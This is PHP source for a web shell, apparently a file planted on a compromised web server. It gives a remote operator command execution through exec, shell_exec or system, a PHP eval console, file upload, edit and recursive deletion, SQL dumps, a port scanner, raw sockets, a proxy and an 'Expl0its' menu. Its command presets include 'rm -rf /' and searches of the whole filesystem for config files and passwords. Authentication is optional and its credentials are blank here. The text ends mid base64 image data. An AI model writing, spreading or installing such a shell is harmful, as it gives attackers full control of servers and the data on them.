<?php
$GLOB['REMOTE']['USER']['Login'] = '';
$GLOB['REMOTE']['USER']['Passw'] = '';

$GLOB['REMOTE']['Ver']  = '';
$GLOB['REMOTE']['Date'] = '';

if (headers_sent())
    $AJGLOBALVARS = true;
else
    $AJGLOBALVARS = false;
@ob_clean();
$AJ_Header_drawn = false;

@set_magic_quotes_runtime(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ini_set('output_buffering', 0);
@error_reporting(E_ALL);

$GLOB['URL']['+Get'] = $_SERVER['PHP_SELF'] . '?';
if (!empty($_GET))
    for ($i = 0, $INDEXES = array_keys($_GET), $COUNT = count($INDEXES); $i < $COUNT; $i++)
        $GLOB['URL']['+Get'] .= $INDEXES[$i] .= '=' . $_GET[$INDEXES[$i]] . (($i == ($COUNT - 1)) ? '' : '&');
$GLOB['PHP']['SafeMode']            = (bool) ini_get('safe_mode');
$GLOB['PHP']['upload_max_filesize'] = ((integer) str_replace(array(
    'K',
    'M'
), array(
    '000',
    '000000'
), ini_get('upload_max_filesize')));

if (get_magic_quotes_gpc() == 1) {
    
    for ($i = 0, $INDEXES = array_keys($_GET), $COUNT = count($INDEXES); $i < $COUNT; $i++) {
        $_GET[$INDEXES[$i]] = stripslashes($_GET[$INDEXES[$i]]);
    }
    
    for ($i = 0, $INDEXES = array_keys($_POST), $COUNT = count($INDEXES); $i < $COUNT; $i++) {
        if (is_array($_POST[$INDEXES[$i]]))
            continue;
        $_POST[$INDEXES[$i]] = stripslashes($_POST[$INDEXES[$i]]);
    }
    
    for ($i = 0, $INDEXES = array_keys($_COOKIE), $COUNT = count($INDEXES); $i < $COUNT; $i++) {
        $_COOKIE[$INDEXES[$i]] = stripslashes($_COOKIE[$INDEXES[$i]]);
    }
}

$GLOB['FILES']['CurDIR'] = getcwd();

$GLOB['SYS']['GZIP']['CanUse'] = $GLOB['SYS']['GZIP']['CanOutput'] = false;

if (isset($_REQUEST['aj_gzip']) OR isset($_REQUEST['aj_zip']) OR isset($_REQUEST['aj_zipdir'])) {
    $GLOB['SYS']['GZIP']['CanUse'] = extension_loaded("zlib");
    if (extension_loaded("zlib"))
        if (!(strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') === FALSE))
            $GLOB['SYS']['GZIP']['CanOutput'] = TRUE;
		elseif (!(strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'zip') === FALSE))
            $GLOB['SYS']['ZIP']['CanOutput'] = TRUE;
}
;
$GLOB['SYS']['GZIP']['IMG'] = extension_loaded("zlib");
$GLOB['SYS']['ZIP']['IMG'] = extension_loaded("zip");

$GLOB['SYS']['OS']['id']   = ($GLOB['FILES']['CurDIR'][1] == ':') ? 'Win' : 'Nix';
$GLOB['SYS']['OS']['Full'] = getenv('OS');
if (empty($GLOB['SYS']['OS']['Full'])) {
    $GLOB['SYS']['OS']['id'] = getenv('OS');
    if (empty($GLOB['SYS']['OS']['id'])) {
        $GLOB['SYS']['OS']['id'] = php_uname();
    }
    if (empty($GLOB['SYS']['OS']['id'])) {
        $GLOB['SYS']['OS']['id'] = '???';
    } else {
        if (preg_match("/^win/i", $GLOB['SYS']['OS']['id']))		
            $GLOB['SYS']['OS']['id'] = 'Win';
        else
            $GLOB['SYS']['OS']['id'] = 'Nix';
    }
}


$GLOB['AjMODES']    = array(
    'WTF' => 'AboutBox',
    
    'DIR' => 'Dir browse',
    'UPL' => 'Upload file',
    'FTP' => 'FTP Actions',
    
    'F_CHM' => 'File CHMOD',
	'F_CHTIME' => 'File change time',
    'F_VIEW' => 'File viewer',
    'F_ED' => 'File Edit',
    'F_DEL' => 'File Delete',
    'F_REN' => 'File Rename',
    'F_COP' => 'File Copy',
    'F_MOV' => 'File Move',
    'F_DWN' => 'File Download',
	
	'D_DEL' => 'Folder Delete',
	
	'ZIP' => 'Zip content',
	'UNZIP' => 'Unzip content',
    
    'SQL' => 'SQL Maintenance',
    'SQLS' => 'SQL Search',
    'SQLD' => 'SQL Dump',
    'PHP' => 'PHP C0nsole',
    'COOK' => 'Cookies Maintenance',
    'CMD' => 'C0mmand line',
    
    'MAIL' => 'Mail functions',
    'STR' => 'String functions',
    'PRT' => 'Port scaner',
    'SOCK' => 'Raw s0cket',
    'PROX' => 'HTTP PROXY',
    'XPL' => 'Expl0its',
    'XSS' => 'XSS Server'
);
$GLOB['AjGET_Vars'] = array(
    'ajinstant',
    'ajmode',
    'ajimg',
    'ajparam',
    'ajval',
    'aj_ok',
    'aj_gzip',
	'aj_zip',
	'aj_zipdir',
    'ajdir',
    'ajdirsimple',
    'ajfile',
    'ajsql_s',
    'ajsql_l',
    'ajsql_p',
    'ajsql_d',
    'ajsql_q',
	'y',
	'd',
	'm',
	's',
	'i',
	'h'
);

$GLOB['VAR']['PHP']['Presets'] = array(
    
    'phpinfo' => 'phpinfo();',
    'GLOBALS' => 'echo \'<plaintext>\'; print_r($GLOBALS);',
    'php_ini' => '$INI=ini_get_all(); ' . "\n" . 'echo \'<table border=0><tr>\'' . "\n\t" . '.\'<td class="listing"><font class="highlight_txt">Param</td>\'' . "\n\t" . '.\'<td class="listing"><font class="highlight_txt">Global value</td>\'' . "\n\t" . '.\'<td class="listing"><font class="highlight_txt">Local Value</td>\'' . "\n\t" . '.\'<td class="listing"><font class="highlight_txt">Access</td></tr>\';' . "\n" . 'foreach ($INI as $param => $values) ' . "\n\t" . 'echo "\n".\'<tr>\'' . "\n\t\t" . '.\'<td class="listing"><b>\'.$param.\'</td>\'' . "\n\t\t" . '.\'<td class="listing">\'.$values[\'global_value\'].\' </td>\'' . "\n\t\t" . '.\'<td class="listing">\'.$values[\'local_value\'].\' </td>\'' . "\n\t\t" . '.\'<td class="listing">\'.$values[\'access\'].\' </td></tr>\';',
    'extensions' => '$EXT=get_loaded_extensions ();' . "\n" . 'echo \'<table border=0><tr><td class="listing">\'' . "\n\t" . '.implode(\'</td></tr>\'."\n".\'<tr><td class="listing">\', $EXT)' . "\n\t" . '.\'</td></tr></table>\'' . "\n\t" . '.count($EXT).\' extensions loaded\';'
);
$GLOB['VAR']['CMD']['Presets'] = array(
    'Call Nik8 with an axe' => '[w0rning] rm -rf /',
    'show opened ports' => 'netstat -an | grep -i listen',
    'find config* files' => 'find / -type f -name "config*"',
    'find all *.php files with word "password"' => 'find / -name *.php | xargs grep -li password',
    'find all writable directories and files' => 'find / -perm -2 -ls',
    'list file attribs on a second extended FS' => 'lsattr -va',
    'View syslog.conf' => 'cat /etc/syslog.conf',
    'View Message of the day' => 'cat /etc/motd',
    'View hosts' => 'cat /etc/hosts',
    'List processes' => 'ps auxw',
    'List user processes' => 'ps ux',
    'Locate httpd.conf' => 'locate httpd.conf',
    'Interfaces' => 'ifconfig',
    'CPU' => '/proc/cpuinfo',
    'RAM' => 'free -m',
    'HDD' => 'df -h',
    'OS Ver' => 'sysctl -a | grep version',
    'Kernel ver' => 'cat /proc/version',
    'Is cURL installed? ' => 'which curl',
    'Is wGET installed? ' => 'which wget',
    'Is lynx installed? ' => 'which lynx',
    'Is links installed? ' => 'which links',
    'Is fetch installed? ' => 'which fetch',
    'Is GET installed? ' => 'which GET',
    'Is perl installed? ' => 'which perl',
    'Where is apache ' => 'whereis apache',
    'Where is perl ' => 'whereis perl',
    'Pack directory' => '"tar -zc /path/ -f name.tar.gz"'
);


function AjError($errstr)
{
    global $AJ_Header_drawn;
    echo "\n\n" . '<table border=0 cellspacing=0 cellpadding=2><tr>' . '<td class=error ' . ((!$AJ_Header_drawn) ? 'style="color:#000000; background-color: #FF0000; font-weight: bold; font-size: 11pt;position:absolute;top=0;left=0;"' : '') . '>' . 'Err: ' . $errstr . '</td></tr></table>' . "\n\n";
    return '';
}

function AjWarning($warn)
{
    echo "\n\n" . '<table border=0 cellspacing=0 cellpadding=2><tr><td class=warning><b>W0rning:</b> ' . $warn . '</td></tr></table>' . "\n\n";
    return '';
}

function AjImg($imgname)
{
    global $AJGLOBALVARS;
    if ($AJGLOBALVARS)
        return '<font class="img_replacer">' . $imgname . '</font>';
    return '<img src="' . AjURL('kill', '') . '&ajmode=IMG&ajimg=' . $imgname . '" title="' . $imgname . '" alt"' . $imgname . '">';
}

function AjObGZ($s)
{
    return gzencode($s);
}

function AjSetCookie($name, $val, $exp)
{
    if (!headers_sent())
        return setcookie($name, $val, $exp, '/');
?>
<script>
var curCookie = "<?php  echo $name;?>=" + escape("<?php  echo $val; ?>") +"; expires=<?php  echo date('l, d-M-y H:i:s', $exp);?> GMT; path=/;";
document.cookie = curCookie;
</script>
<?php
}

function AjRandom($range = '48-57,65-90,97-122')
{
    $range = explode(',', $range);
    $range = explode('-', $range[rand(0, count($range) - 1)]);
    return rand($range[0], $range[1]);
}

function AjRandomChars($num)
{
    $ret = '';
    for ($i = 0; $i < $num; $i++)
        $ret .= chr(AjRandom('48-57,65-90,97-122'));
    return $ret;
}

function AjZeroedNumber($int, $totaldigits)
{
    $str = (string) $int;
    while (strlen($str) < $totaldigits)
        $str = '0' . $str;
    return $str;
}

function AjPrint_ParamState($name, $state, $invert = false)
{
    echo $name . ' : ';
    $invert = (bool) $invert;
    if (is_bool($state))
        echo ($state) ? '<font color=#' . (($invert) ? 'FF0000' : '00FF00') . '><b>ON</b></font>' : '<font color=#' . (($invert) ? '00FF00' : 'FF0000') . '><b>OFF</b></font>';
    else
        echo '<b>' . $state . '</b>';
}

function AjStr_FmtFileSize($size)
{
    if ($size >= 1073741824) {
        $size = round($size / 1073741824 * 100) / 100 . " GB";
    } elseif ($size >= 1048576) {
        $size = round($size / 1048576 * 100) / 100 . " MB";
    } elseif ($size >= 1024) {
        $size = round($size / 1024 * 100) / 100 . " KB";
    } else {
        $size = $size . " B";
    }
    return $size;
}

function AjDate($UNIX)
{
    return date('d.M\'Y H:i:s', $UNIX);
}

function AjDateY($UNIX)
{
    return date('Y', $UNIX);
}

function AjDateM($UNIX)
{
    return date('m', $UNIX);
}

function AjDateD($UNIX)
{
    return date('d', $UNIX);
}

function AjDateH($UNIX)
{
    return date('H', $UNIX);
}

function AjDateI($UNIX)
{
    return date('i', $UNIX);
}

function AjDateS($UNIX)
{
    return date('s', $UNIX);
}


function AjDesign_DrawBubbleBox($header, $body, $width)
{
    $header = str_replace(array(
        '"',
        "'",
        "`"
    ), array(
        '&#x02DD;',
        '&#x0027;',
        ''
    ), $header);
    $body   = str_replace(array(
        '"',
        "'",
        "`"
    ), array(
        '&#x02DD;',
        '&#x0027;',
        ''
    ), $body);
    return ' onmouseover=\'showwin("' . $header . '","' . $body . '",' . $width . ',1)\' onmouseout=\'showwin("","",0,0)\' onmousemove=\'movewin()\' ';
}

function AjChmod_Str2Oct($str) 
{
    $str     = str_pad($str, 9, '-');
    $str     = strtr($str, array(
        '-' => '0',
        'r' => '4',
        'w' => '2',
        'x' => '1'
    ));
    $newmode = '';
    for ($i = 0; $i < 3; $i++)
        $newmode .= $str[$i * 3] + $str[$i * 3 + 1] + $str[$i * 3 + 2];
    
    return $newmode;
}

function AjChmod_Oct2Str($perms) /* 777 => rwxrwxrwx. USE ONLY STRING REPRESENTATION OF $oct !!!! */ 
{
    $info = '';
    if (($perms & 0xC000) == 0xC000)
        $info = 'S';
    /*  Socket */
    elseif (($perms & 0xA000) == 0xA000)
        $info = 'L'; /* Symbolic Link */ 
    elseif (($perms & 0x8000) == 0x8000)
        $info = '&nbsp;'; /* '-'*/ /* Regular */ 
    elseif (($perms & 0x6000) == 0x6000)
        $info = 'B'; /* Block special */ 
    elseif (($perms & 0x4000) == 0x4000)
        $info = 'D'; /* Directory*/ 
    elseif (($perms & 0x2000) == 0x2000)
        $info = 'C'; /* Character special*/ 
    elseif (($perms & 0x1000) == 0x1000)
        $info = 'P';
    /* FIFO pipe*/
    else
        $info = '?';
    /* Unknown */
    if (!empty($info))
        $info = '<font class=rwx_sticky_bit>' . $info . '</font>';
    /* Owner */
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= '/';
    /* Group */
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= '/';
    /* World */
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function AjFileToUrl($filename)
{
    /* kills & and = to be okay in URL */
    return str_replace(array(
        '&',
        '=',
        '\\'
    ), array(
        '%26',
        '%3D',
        '/'
    ), $filename);
}

function AjFileOkaySlashes($filename)
{
    return str_replace('\\', '/', $filename);
}

function AjURL($do = 'kill', $these = '') /* kill: '' - kill all ours, 'a,b,c' - kill $a,$b,$c ; leave: '' - as is, leave 'a,b,c' - leave only $a,$b,$c */ 
{
    global $GLOB;
    if ($these == '')
        $these = $GLOB['AjGET_Vars'];
    else
        $these = explode(',', $these);
    
    $ret = $_SERVER['PHP_SELF'] . '?';
    if (!empty($_GET))
        for ($i = 0, $INDEXES = array_keys($_GET), $COUNT = count($INDEXES); $i < $COUNT; $i++)
            if (!in_array($INDEXES[$i], $GLOB['AjGET_Vars']) OR ( /* if not ours - add */ ($do == 'kill' AND !in_array($INDEXES[$i], $these)) OR ($do == 'leave' AND in_array($INDEXES[$i], $these))))
                $ret .= $INDEXES[$i] .= '=' . $_GET[$INDEXES[$i]] . (($i == ($COUNT - 1)) ? '' : '&');
    if (substr($ret, -1, 1) == '&')
        $ret = substr($ret, 0, strlen($ret) - 1);
    return $ret;
}

function AjGETinForm($do = 'kill', $these = '') /* Equal to AjURL(), but prints out $_GET as form <input type=hidden> params */ 
{
    $link = substr(strchr(AjURL($do, $these), '?'), 1);
    $link = explode('&', $link);
    echo "\n" . '<!--$_GET;-->';
    for ($i = 0, $COUNT = count($link); $i < $COUNT; $i++) {
        $cur = explode('=', $link[$i]);
        echo '<input type=hidden name="' . str_replace('"', '&quot;', $cur[0]) . '" value="' . str_replace('"', '&quot;', $cur[1]) . '">';
    }
}

function AjGotoURL($URL, $noheaders = false)
{
    if ($noheaders or headers_sent()) {
        echo "\n" . '<div align=center>Redirecting...<br><a href="' . $URL . '">Press here in shit happens</a>';
        echo '<script>location="' . $URL . '";</script>';
    } else
        header('Location: ' . $URL);
    return 1;
}

if (!function_exists('mime_content_type')) {
    if ($GLOB['SYS']['OS']['id'] != 'Win') {
        function mime_content_type($f)
        {
            $f = @escapeshellarg($f);
            return @trim(`file -bi ` . $f);
        }
    } else {
        function mime_content_type($f)
        {
            return 'Content-type: text/plain';
        }
        /* Nothing alike under win =( if u have some thoughts - touch me */
    }
}

function AjMySQL_FetchResult($MySQL_res, &$MySQL_Return_Array, $idmode = false)
{
    $MySQL_Return_Array = array();
    
    if ($MySQL_res === false)
        return 0;
    if ($MySQL_res === true)
        return 0;

	$ret = $MySQL_res->num_rows;
	
    if ($ret <= 0)
        return 0;  
	
    if ($idmode) {
		while ($MySQL_Return_Array[] = mysqli_fetch_array($MySQL_res, MYSQLI_NUM)){}
	} else {
		while ($MySQL_Return_Array[] = mysqli_fetch_array($MySQL_res, MYSQLI_ASSOC)){}
	}	

    array_pop($MySQL_Return_Array);
    
    for ($i = 0; $i < count($MySQL_Return_Array); $i++) {
        if ($i == 0) {
            $INDEXES = array_keys($MySQL_Return_Array[$i]);
            $count   = count($INDEXES);
        }
        for ($j = 0; $j < $count; $j++) {
            $key =& $INDEXES[$j];
            $val =& $MySQL_Return_Array[$i][$key];
            if (is_string($val))
                $val = stripcslashes($val);
        }
    }
    return $ret;
}

function AjMySQLQ($query, $die_on_err)
{
	global $dbh;
	
	$result = $dbh->query($query);	

    if (!$result) {
        AjError('" ' . $query . ' "' . "\n" . '<br>MySQL:#' . $dbh->error);
        if ($die_on_err)
            die();
    }
    return $result;
}

function AjDecorVar(&$var, $htmlstr)
{
    if (is_null($var))
        return 'NULL';
    if (!isset($var))
        return '[!isset]';
    
    if (is_bool($var))
        return ($var) ? 'true' : 'false';
    if (is_int($var))
        return (int) $var;
    if (is_float($var))
        return number_format($var, 4, '.', '');
    if (is_string($var)) {
        if (empty($var))
            return '&nbsp;';
        if (!$htmlstr)
            return '' . ($var) . '';
        else
            return '' . str_replace("\n", "<br>", str_replace("\r", "", htmlspecialchars($var))) . '';
    }
    if (is_array($var))
        return '(ARR)' . var_export($var, true) . '(/ARR)';
    if (is_object($var))
        return '(OBJ)' . var_export($var, true) . '(/OBJ)';
    if (is_resource($var))
        return '(RES:' . get_resource_type($var) . ')' . var_export($var, true) . '(/RES)';
    return '(???)' . var_export($var, true) . '(/???)';
}

function AjHTTPMakeHeaders($method = '', $URL = '', $host = '', $user_agent = '', $referer = '', $posts = array(), $cookie = array())
{
    if (!empty($posts)) {
        $postValues = '';
        foreach ($posts AS $name => $value) {
            $postValues .= urlencode($name) . "=" . urlencode($value) . '&';
        }
        $postValues = substr($postValues, 0, -1);
        $method     = 'POST';
    } else
        $postValues = '';
    
    if (!empty($cookie)) {
        $cookieValues = '';
        foreach ($cookie AS $name => $value) {
            $cookieValues .= urlencode($name) . "=" . urlencode($value) . ';';
        }
        $cookieValues = substr($cookieValues, 0, -1);
    } else
        $cookieValues = '';
    
    $request = $method . ' ' . $URL . ' HTTP/1.1' . "\r\n";
    if (!empty($host))
        $request .= 'Host: ' . $host . "\r\n";
    if (!empty($cookieValues))
        $request .= 'Cookie: ' . $cookieValues . "\r\n";
    if (!empty($user_agent))
        $request .= 'User-Agent: ' . $user_agent . ' ' . "\r\n";
    $request .= 'Connection: Close' . "\r\n";
    /* Or connection will be endless */
    if (!empty($referer))
        $request .= 'Referer: ' . $referer . "\r\n";
    if ($method == 'POST') {
        $lenght = strlen($postValues);
        $request .= 'Content-Type: application/x-www-form-urlencoded' . "\r\n";
        $request .= 'Content-Length: ' . $lenght . "\r\n";
        $request .= "\r\n";
        $request .= $postValues;
    }
    $request .= "\r\n\r\n";
    return $request;
}

function AjFiles_UploadHere($path, $filename, &$contents)
{
    if (empty($contents))
        die(AjError('Received empty'));
    $filename = '__UPLOAD__' . AjRandomChars(3) . '__' . $filename;
    if (!($f = fopen($path . $filename, 'w'))) {
        $path = '/tmp/';
        if (!($f = fopen($path . $filename, 'w')))
            die(AjError('Writing denied. Save to "' . $path . $filename . '" also failed! =('));
        else
            AjWarning('Writing failed, but saved to "' . $path . $filename . '"! =)');
    }
    fputs($f, $contents);
    fclose($f);
    echo "\n" . 'Saved file to "' . $path . $filename . '" - OK';
    echo "\n" . '<br><a href="' . AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($path)) . '">[Go DIR]</a>';
    ;
}

function AjRDir($path) {
	if (file_exists($path) and is_dir($path)) {
		$dir = opendir($path);
	
		while (false !== ($element = readdir($dir))) {
			if ($element != '.' and $element != '..')  {
				$tmp = $path . '/' . $element;
				chmod($tmp, 0777);
				if (is_dir($tmp)) {
					AjRDir( $tmp );
				} else {
					if (unlink( $tmp ) === false) {
						return false;
						break;
					}
				}
			}
		}

		closedir($dir);

		if (file_exists($path)) {
			if (rmdir($path) === false) {
				return false;
			}
		}
	}
}

function AjZipFolder ($path)
{
	$path_parts = pathinfo($path);
	$zip = new ZipArchive();
	$zip->open($path_parts['filename'] . '.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
	$filesToDelete = array();
	$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($path),
    RecursiveIteratorIterator::LEAVES_ONLY
	);

	foreach ($files as $name => $file)
	{
		if (!$file->isDir()) {
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($path) + 1);
			$zip->addFile($filePath, $relativePath);
		}
	}

	$zip->close();
	
	return $path_parts['filename'] . '.zip';
}

function AjZipFile ($filepath)
{
	$path_parts = pathinfo($filepath);

	$zip = new ZipArchive;

	if ($zip->open($path_parts['filename'] . '.zip', ZipArchive::CREATE) === true){
		$zip->addFile($filepath, $path_parts['basename']);
		$zip->close();
	} else 
		die(AjError('Can\'t add file ' . $path_parts['basename'] . ' to arhive!'));
	
	return $path_parts['filename'] . '.zip';
}

function AjUnzip ($filepath)
{
	$path_parts = pathinfo($filepath);
	
	$zip = new ZipArchive;
	
	if ($zip->open($filepath) === true) {
		$zip->extractTo($path_parts['dirname']);
		$zip->close();
		return true;
	} else 
		return false;
}

function AjExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */ 
{
    $OUT = array();
    $RET = '';
    if (function_exists('exec')) {
        if (!empty($cmd))
            exec($cmd, $OUT, $RET);
       
        return array(
            true,
            true,
            'exec',
            ''
        );
    } elseif (function_exists('shell_exec')) {
        if (!empty($cmd))
            $OUT[0] = shell_exec($cmd);
       
        return array(
            true,
            false,
            'shell_exec',
            '<s>exec</s> shell_exec'
        );
    } elseif (function_exists('system')) {
        if (!empty($cmd))
            $OUT[0] = system($cmd, $RET);
       
        return array(
            true,
            false,
            'system',
            '<s>exec</s> <s>shell_exec</s> system<br>Only last line of output is available, sorry =('
        );
    } else
        return array(
            FALSE,
            FALSE,
            '&lt;noone&gt;',
            '<s>exec</s> <s>shell_exec</s> <s>system</s> Bitchy admin has disabled command line!! =('
        );
    ;
}

###################################################################################
#####################++++++++++++# L O G I N #++++++++++++++++#####################
###################################################################################
if (isset($_GET['ajmode']) ? $_GET['ajmode'] == 'IMG' : false) {
    /* IMGS are allowed without passwd =) */
    $GLOB['REMOTE']['USER']['Login'] = '';
    $GLOB['REMOTE']['USER']['Passw'] = '';
}

if (isset($_GET['ajinstant']) ? $_GET['ajinstant'] == 'logoff' : false) {
    if ($AJGLOBALVARS) {
        if (isset($_COOKIE['AjS_AuthC']))
            AjSetCookie('AjS_AuthC', '---', 1);
    } else {
        header('WWW-Authenticate: Basic realm="==== HIT CANCEL OR PRESS ESC ====' . base_convert(crc32(mt_rand(0, time())), 10, 36) . '"');
        header('HTTP/1.0 401 Unauthorized');
    }
    
    echo '<html>Redirecting... press <a href="' . AjURL('kill', '') . '">here if shit happens</a>';
    AjGotoURL(AjURL('kill', ''), '1noheaders');
    die();
}

if (((strlen($GLOB['REMOTE']['USER']['Login']) + strlen($GLOB['REMOTE']['USER']['Passw'])) >= 2)) {
    if ($AJGLOBALVARS) {
        if (isset($_POST['AjS_Auth']) or isset($_COOKIE['AjS_AuthC'])) {
            if (!(((@$_POST['AjS_Auth']['L'] == $GLOB['REMOTE']['USER']['Login']) AND /* form */ (@$_POST['AjS_Auth']['P'] == $GLOB['REMOTE']['USER']['Passw'] OR (strlen($GLOB['REMOTE']['USER']['Passw']) == 32 AND @$_POST['AjS_Auth']['P'] == md5($GLOB['REMOTE']['USER']['Passw'])))) OR @$_COOKIE['AjS_AuthC'] == md5($GLOB['REMOTE']['USER']['Login'] . $GLOB['REMOTE']['USER']['Passw']) /* cookie */ )) {
                echo (AjError('Fucked off brutally'));
                unset($_POST['AjS_Auth'], $_COOKIE['AjS_AuthC']);
            } else
                AjSetCookie('AjS_AuthC', md5($GLOB['REMOTE']['USER']['Login'] . $GLOB['REMOTE']['USER']['Passw']), time() + 60 * 60 * 24 * 2);
        }
        if (!isset($_POST['AjS_Auth']) AND !isset($_COOKIE['AjS_AuthC'])) {
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=POST style="position:absolute;z-index:100;top:0pt;left:40%;width:100%;height:100%;">';
            echo "\n" . '<br><input type=text name="AjS_Auth[L]" value="<LOGIN>"     onfocus="this.value=\'\'"  style="width:200pt">';
            echo "\n" . '<br><input type=text name="AjS_Auth[P]" value="<PASSWORD>"     onfocus="this.value=\'\'"  style="width:200pt">';
            echo "\n" . '<br><input type=submit value="Ok" style="width:200pt;"></form>';
            echo "\n" . '</form>';
            die();
        }
    } else {
        if (!isset($_SERVER['PHP_AUTH_USER'])) {
            header('WWW-Authenticate: Basic Auth"');
            header('HTTP/1.0 401 Unauthorized');
            /* Result if user hits cancel button */
            unset($_GET['ajinstant']);
            die(AjError('Fucked off brutally'));
        } else if (!($_SERVER['PHP_AUTH_USER'] == $GLOB['REMOTE']['USER']['Login'] AND ($_SERVER['PHP_AUTH_PW'] == $GLOB['REMOTE']['USER']['Passw'] OR (strlen($GLOB['REMOTE']['USER']['Passw']) == 32 AND md5($_SERVER['PHP_AUTH_PW']) == $GLOB['REMOTE']['USER']['Passw'])))) {
            header('WWW-Authenticate: Basic realm="AjS ' . $GLOB['REMOTE']['Ver'] . ' Auth: Fucked off brutally"');
            header('HTTP/1.0 401 Unauthorized');
            /* Result if user hits cancel button */
            unset($_GET['ajinstant']);
            die(AjError('Fucked off brutally'));
        }
    }
}

###################################################################################
####################++++++# I N S T A N T    U S A G E #+++++++####################
###################################################################################
if (!isset($_GET['ajmode']))
    $_GET['ajmode'] = 'DIR';
else
    $_GET['ajmode'] = strtoupper($_GET['ajmode']);


switch ($_GET['ajmode']) {
    
    case 'IMG':
        $IMGS = array(
            'AjS' => 'R0lGODlhEAAQAIAAAAD/AAAAACwAAAAAEAAQAAACL4yPGcCs2NqLboGFaXW3X/tx2WcZm0luIcqFKyuVHRSLJOhmGI4mWqQAUoKPYqIAADs=',
            'folder' => 'R0lGODlhDwAMAJEAAP7rhriFIP///wAAACH5BAEAAAIALAAAAAAPAAwAAAIklIJhywcPVDMBwpSo3U/WiIVJxG0IWV7Vl4Joe7Jp3HaHKAoFADs=',
            'foldup' => 'R0lGODlhDwAMAJEAAP7rhriFIAAAAP///yH5BAEAAAMALAAAAAAPAAwAAAIw3IJiywcgRGgrvCgA2tNh/Dxd8JUcApWgaJFqxGpp+GntFV4ZauV5xPP5JIeTcVIAADs=',
            'view' => 'R0lGODlhEAAJAJEAAP///wAAAP///wAAACH5BAEAAAIALAAAAAAQAAkAAAIglB8Zx6aQYGIRyCpFsFY9jl1ft4Fe2WmoZ1LROzWIIhcAOw==',
            'del' => 'R0lGODlhEAAQAKIAAIoRGNYnOtclPv///////wAAAAAAAAAAACH5BAEAAAQALAAAAAAQABAAAANASArazQ4MGOcLwb6BGQBYBknhR3zhRHYUKmQc65xgKM+0beKn3fErm2bDqomIRaMluENhlrcFaEejPKgL3qmRAAA7',
            'copy' => 'R0lGODlhEAAQAKIAAP//lv///3p6egAAAP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAQABAAAAM+SKrT7isOQGsII7Jq7/sTdWEh53FAgwLjILxp2WGculIurL68XsuonCAG6PFSvxvuuDMOQcCaZuJ8TqGQSAIAOw==',
            'move' => 'R0lGODlhEAAQAJEAADyFFLniPu79wP///yH5BAEAAAMALAAAAAAQABAAAAI3nD8AyAgiVnMihDidldmAnXFfIB6Pomwo9kCu5bqpRdf18qGjTpom6AkBO4lhqHLhCHtEj/JQAAA7',
            'exec' => 'R0lGODlhoQFLAKIAADc2NX98exkYGFxZWaOengEBAQAAAAAAACwAAAAAoQFLAAAD/1i63P4wykmrvTjrzbv/YCiOpCcMAqCuqhCAgCDPM1AEKQsM8SsXAuAviNOtXJQYrXYCmh5BRWA3qFp5rwlqSRtMTrnWMSuZGlvkjpIrs0mipbh8nnFD4B08VGKP6Bt/DoELgyR9Dod7fklvjIsfhU50k5SVFjY/C26RFoVBmGxNi6BKCp8UUXpBmXReNTsxBV5fkoSrjDNOKQWJiEJsvRmRnJbFxoYMq7HBGJ68Qrozs3xAKr60fswiXipWpdOLf7cTfVHLuIKiT4/H7e7IydbPkKO60CngEDY7q7faphJQUJpiJcCWIPkU3XFkSobAf89S/doBYti7ixjVNOCnAP8iqnpLgFTRdqrKA4ieEpYQQGCAwSo0ZH1kFyGRPIigNvKo2Cijz5/k4tnxiK3mvY48cMKy1ZGhIJUkWLqEGRNqsp7UAII5FTTXqpE8aQIdO9YOPn9h94BSBhOiFVXzsAKiSIlAAINrnFglJFdfPIFxjUrEt5OeWLKIMcI5AY5oI1Z8Mf2yEhjCS75OUOorPKmlQS4yiyYbR83cTq6lo410fPgqscSw5wzlAYf1nRx+GVDZpwVvzB+aH9Be6aDlwaozCS0ltnhpU9FIk6Y9KS+29WKuGK9R1+FKv1xbYgC4+zkNHsKABaGjAUvyQgyJPucu3abKlF2LstsHT+HFkfH/d41Xywab9EMFDtcleAwVUVHBWTYMflFFS+KxIEMa7+n0WjOJGHeFNxi+4WB6RTl31QXdkCgCerFsqOCLDtC2hHg3jEfAjR8WcQY/5PV41412AeljgD0CeeOQQwppWwM4vGTfjeOFYUQKVIbiwgqrodGfS0i+8KORR95l5S5TfPmSQTqe4aWPRoppRjdw+sfFCjeQB6ZdIcKoZ3J+udTSRgPGKAiAaIqpyAkv/bNDABQOaI5T0UXUGiCawNXPaKFFUJCPNuTZgCv29eGeZbVxiYIPkwJEEJd3bZGFi3u+eKk9RBC6nUzf/UIEL1gy+iOrOpCZAqc7dsPoAC3B6oCc/20EiOs9aJEWmRAHZdaflOKdAECQRwLpBap7vGAqcmvl0qksO4B5Q0SgubdYDkH+iNe5sdbbVbjjUcWftKryumiRwG5nw6mctvHfsK3+meoCPkgD07Pq8TvtWb9URmnDMxqE55DfBsqkC1Mhd4tE56rA5rrfxTSqJlN5Rh4L69or8x6FkKfvD64AdJV/hNrs8n3sycJqq//pwCqysWQYAbOLCpQzpfaoJRJgwHnMALP1IYtslx1HUijQOEej8rr2+cjSPENULU7LPSZljacz1+sJSy+H9DRmuw5tM5oubUem3m4HOzSyFk2A8VSx3D2aRZjcjFq4vNRn59ZIdr2Qy//HIaTrb2TL+yueq40tDhUbz/t23Kg/B8W25IGWMyu3/Nw